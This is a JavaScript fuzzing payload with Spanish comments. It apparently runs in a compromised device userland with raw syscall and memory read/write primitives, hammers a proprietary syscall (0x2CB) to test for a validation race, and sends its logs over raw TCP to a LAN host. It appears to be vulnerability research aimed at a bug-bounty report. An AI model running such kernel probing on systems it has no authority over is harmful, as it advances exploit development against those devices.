// 2026-08-28 fuzz_s4_1320: SESION 4 - EL MARTILLO de IOREQ. S3 demostro que el ok:0x0 de S1 no se reproduce NI con replay exacto NI con 3 layouts -> H-RACE: la validacion de IOREQ tipo 1 es NO-DETERMINISTA (race interna) y el ok se gana con baja probabilidad; este payload martillea la forma ganadora y cuenta exitsos.
// Forma martillada = la jugadora EXACTA de S1: IOREQ(0x2CB) cmd=1, buf malloc(0x4000) con 0x5C SOLO en los primeros 0x80 (resto tal cual malloc), len=0x100. Preparacion UNICA: un solo buffer hb, NO se rearma tras hits (si el kernel escribe, eso tambien es dato).
// Martillo: 2000 syscalls SIN W por EINVAL (solo contadores/histograma), W solo en hits (+oraculo) y cada 200 (progreso+errno). Veredicto por umbrales: 0=no confirmada, 1-2=RACE PROBABLE, >=3=RACE CONFIRMADA (tasa) + 2a tanda de 2000 solo si hits>=1 para medir la tasa. KNOWN={2,13,14,22}. Vetados mmap/thr_new/rfork; bucles acotados; ultima linea "PAYLOAD DONE".
(()=>{
const I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const SCHED_YIELD=331n;
const S_IOREQ=0x2CBn;
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const N=(s)=>{try{send_notification(s)}catch(e){}};
const EN=()=>{try{const m=/^(\d+)/.exec(get_error_string());return m?parseInt(m[1],10):-1}catch(e){return -1}};
// --- canal TCP crudo 192.168.1.67:8081 (identico fuzz_s1/fuzz_s2/fuzz_s3) ---
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);const cr=I(syscall(SYSCALL.connect,sock,sa,16n));if(cr<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
W("[hammer] SESION 4 MARTILLO IOREQ - H-RACE (validacion no-determinista) - forma (1, hb[0x5C@0..0x80], 0x100) x2000");
// --- helpers de sesion 1/3: hex, arm (cap 0x80) y oraculo (primeros 0x40 vs qword del patron) ---
const HX=(v)=>{let x=BigInt.asUintN(64,BigInt(v)),s="";for(let i=0;i<8;i++){s="0123456789abcdef"[Number(x&0xffn)]+s;x>>=8n}return s};
const arm=(b,p,sz)=>{try{let n=sz<0x80?sz:0x80;for(let i=0;i<n;i++)write8(b+BigInt(i),p)}catch(e){}};
const oracle=(b,t,p,sz)=>{try{let n=sz<0x40?sz:0x40;const q0=BigInt(p)*0x0101010101010101n;let h="",d=false;
  for(let i=0;i<n;i+=8){const q=BigInt.asUintN(64,BigInt(read64(b+BigInt(i))));h+=HX(q)+" ";if(q!==q0)d=true}
  if(d)W(t+": "+h.trim())}catch(e){W(t+": LECTURA FAULT (kernel desmapeo el buffer?)")}};
// dump COMPLETO (siempre imprime, sin filtro de diffs): zona armada 0x80 en lineas de 64 bytes.
const fullDump=(b,t,nbytes)=>{try{let line="";for(let i=0;i<nbytes;i+=8){const q=BigInt.asUintN(64,BigInt(read64(b+BigInt(i))));line+=HX(q)+" ";
  if((i&0x3f)===0x38){W(t+" +0x"+i.toString(16)+": "+line.trim());line=""}}
  if(line)W(t+" +tail: "+line.trim())}catch(e){W(t+": LECTURA FAULT")}};
// ============ PREPARACION UNICA: hb con el layout ganador de S1 (0x5C solo en [0,0x80), resto tal cual malloc) ============
const BUF=0x4000;
const hb=malloc(BUF);
arm(hb,0x5C,BUF); // arm() topa en 0x80 -> exactamente el layout de V14/buf2 de la sesion 1
W("[hammer] hb=0x"+HX(hb)+" armado 0x5C en [0,0x80) (layout S1) - preparacion UNICA, no se rearma tras hits");
// ============ BUCLE MARTILLO: 2000 syscalls, W solo en hits y cada 200 (contadores el resto) ============
const KNOWN={2:1,13:1,14:1,22:1};
const hist={},seen={};const news=[];
let hits=0,tries=0,ex=0;
const hammer=(tag,n)=>{
  const h0=hits;
  for(let i=0;i<n;i++){
    tries++;
    try{
      const r=I(syscall(S_IOREQ,1n,hb,0x100n));
      if(r>=0n){hits++;
        W("["+tag+"] HIT #"+hits+" en iter "+i+" ret=0x"+r.toString(16));
        oracle(hb,"["+tag+"] HIT#"+hits+" oracle hb (escribio el kernel?)",0x5C,BUF);
      }else{
        const e=EN();hist[e]=(hist[e]||0)+1;
        const k="e"+e;if(!KNOWN[e]&&!seen[k]){seen[k]=1;news.push(k);W("["+tag+"] NUEVO errno "+e+" en iter "+i)}
      }
    }catch(err){ex++;if(ex===1)W("["+tag+"] primera EXcepcion en iter "+i+": "+err)}
    if(i%200===0)W("["+tag+"] i="+i+" hits="+hits+" errno_actual="+EN());
  }
  return hits-h0;
};
W("[hammer] TANDA 1: 2000 intentos IOREQ(1,hb,0x100)");
const t1=hammer("hammer",2000);
W("[hammer] TOTAL: "+t1+" hits / 2000 intentos");
W("[hammer] hist errno: "+Object.keys(hist).map((k)=>"e"+k+"="+hist[k]).join(" ")+" ex="+ex);
// ============ VEREDICTO AUTOMATICO POR UMBRALES ============
let verdict="";
if(t1===0)verdict="H-RACE no confirmada en 2000 intentos (o ventana < 1/2000)";
else if(t1<=2)verdict="RACE PROBABLE: hits esporadicos = validacion no-determinista - documentar y evaluar reporte";
else verdict="RACE CONFIRMADA: tasa "+(t1/2000)+" - explore que hace el ok (oracles) y evaluar reporte HackerOne (syscall propietaria con validacion no-determinista)";
W("[hammer] VEREDICTO tanda 1: "+verdict);
// ============ 2a tanda SOLO si hubo hits (medir tasa) + dump completo de hb tras los hits ============
let t2=0;
if(t1>=1){
  W("[hammer] dump COMPLETO de hb tras los hits (zona armada 0x80):");
  fullDump(hb,"[hammer] hb",0x80);
  W("[hammer] TANDA 2: 2000 intentos mas para medir la tasa");
  t2=hammer("hammer2",2000);
  W("[hammer] TOTAL 2a tanda: "+t2+" hits / 2000 | combinado "+(t1+t2)+"/4000 = "+((t1+t2)/4000));
  if(t2>=3)verdict="RACE CONFIRMADA: tasa "+((t1+t2)/4000)+" (1a="+t1+" 2a="+t2+") - explore que hace el ok (oracles) y evaluar reporte HackerOne (syscall propietaria con validacion no-determinista)";
  else if(t2===0&&t1>=3)verdict+=" | 2a=0/2000: ventana unica/estado transitorio, NO race sostenida (mirar que consumio la ventana)";
  else if(t2===0)verdict+=" | 2a=0/2000: el hit pudo ser estado/ventana unica - refuerza H-PRIMING sobre H-RACE";
  else verdict+=" | 2a="+t2+": hits esporadicos en AMBAS tandas = race de baja tasa sostenida (tasa total "+((t1+t2)/4000)+")";
}
W("[hammer] VEREDICTO FINAL: "+verdict);
W("[hammer] RESUMEN: "+hits+" hits / "+tries+" intentos | t1="+t1+"/2000 t2="+t2+"/2000 | ex="+ex+" | nuevos=["+news.join(" ")+"]");
// ============ CIERRE: veredicto por notificacion + cuenta regresiva + DONE ============
const vt=("S4 martillo: "+hits+"/"+tries+" hits - "+verdict).slice(0,90);
N(vt);
for(let i=0;i<150;i++){N("["+(150-i)+"] "+vt);for(let j=0;j<3000;j++){syscall(SCHED_YIELD)}}
W("PAYLOAD DONE");
try{if(sock>=0n)syscall(SYSCALL.close,sock)}catch(e){}
})();
